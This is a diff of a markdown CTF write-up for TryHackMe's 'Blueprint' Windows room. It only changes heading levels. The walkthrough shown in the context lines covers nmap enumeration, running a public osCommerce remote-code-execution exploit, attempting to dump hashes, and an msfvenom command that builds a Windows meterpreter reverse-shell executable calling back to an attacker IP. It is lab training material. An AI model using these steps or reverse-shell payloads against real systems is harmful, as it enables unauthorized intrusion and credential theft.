@@ -12,13 +12,13 @@ tags: [tryhackme, windows, metasploit, meterpreter, easy, msfvenom]
 ---
 
 
-# **Description**
+## **Description**
 
 Hello hackers, I hope you are doing well. We are doing [Blueprint](https://tryhackme.com/room/blueprint) from [TryHackMe](https://tryhackme.com). It's an easy windows machine running a software program with a version vulnerable to remote code execution.
 
-# **Enumeration**
+## **Enumeration**
 
-## nmap
+### nmap
 
 We start a nmap scan using the following command: `sudo nmap -sC -sV -T4 {target_IP}`.
 
@@ -89,7 +89,7 @@ Host script results:
 
 We have a windows machine, running a webserver on port 80 and port 8080, SMB and mysql.
 
-## Web
+### Web
 
 Let's navigate to the webpage on port 8080.
 
@@ -106,7 +106,7 @@ We see oscommerce with what we assume to be a version number. Let's search for *
 OsCommerce is an online store management software program, and it is vulnerable to remote code execution in this exact version this machine is running.
 
 
-# **Foothold**
+## **Foothold**
 
 Let's download the exploit and run it.
 
@@ -129,7 +129,7 @@ Now let's dump the hashes.
 We can't do that because the current meterpreter we're using (php/meterpreter) is not supported. Let's upgrade to **windows/meterpreter*.
 
 
-# **Shell Stabilization**
+## **Shell Stabilization**
 
 First, we need to create an executable using msfvenom with this command.`msfvenom -p windows/meterpreter/reverse_tcp LHOST=Attacker_IP LPORT=1234 -f exe -o shell.exe`
 
@@ -162,4 +162,4 @@ Thank you for taking the time to read my write-up, I hope you have learned somet
 
 ---
 
-# References
+## References
